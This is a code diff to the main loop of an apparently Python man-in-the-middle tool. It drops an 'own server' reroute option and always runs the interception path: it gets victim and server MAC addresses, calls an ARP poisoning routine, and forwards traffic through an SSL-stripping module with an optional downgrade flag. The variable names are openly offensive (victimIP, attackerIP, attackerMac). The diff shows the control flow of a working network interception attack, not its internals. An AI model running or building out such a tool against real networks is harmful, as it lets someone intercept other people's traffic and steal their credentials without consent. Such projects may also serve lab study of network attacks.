@@ -56,36 +56,22 @@ def main():
                     parts = [p.strip() for p in targets.split(',')]
                     victimIP = parts[0] if parts[0] != "none" else None
                     serverIP = parts[1] if parts[1] != "none" else None
-
-            while (goal != "mitm" and goal != "ownserver"):
-                if (goal != ""):
-                    print("Invalid input, please try again") 
-                goal = input("Enter a goal: 'mitm' or 'ownserver': ").strip().lower()
-
-
-            if goal == "ownserver":
-                while (not is_ipv4_address(ownServerIp)):
-                    if (ownServerIp != ""):
-                        print("Invalid input, please try again")                    
-                    ownServerIp = input("Enter a ip adress to reroute victim to: ").strip().lower()
+                serverMac = get_mac(serverIP)
+                victimMac = get_mac(victimIP)
                     
-            elif goal == "mitm":
-                while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
-                    if (sslStrip != ""):
-                        print("Invalid input, please try again")                    
-                    sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
+
+            while (sslStrip != "yes" and sslStrip != "no" and sslStrip != "y" and sslStrip != "n"):
+                if (sslStrip != ""):
+                    print("Invalid input, please try again")                    
+                sslStrip = input("Use ssl stripping when possible: (y/n) ").strip().lower()
 
             if ipt == "arp":
                 serverMac, victimMac, serverIP, victimIP = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
-
-            if goal == "ownserver":
-                return
                 
-            elif goal == "mitm":
-                if (sslStrip == "yes" or sslStrip == "y"):
-                    sslStripping.forwarding(True, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
-                else:
-                    sslStripping.forwarding(False, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+            if (sslStrip == "yes" or sslStrip == "y"):
+                sslStripping.forwarding(True, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+            else:
+                sslStripping.forwarding(False, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
 
         elif ipt == "quit":
             break
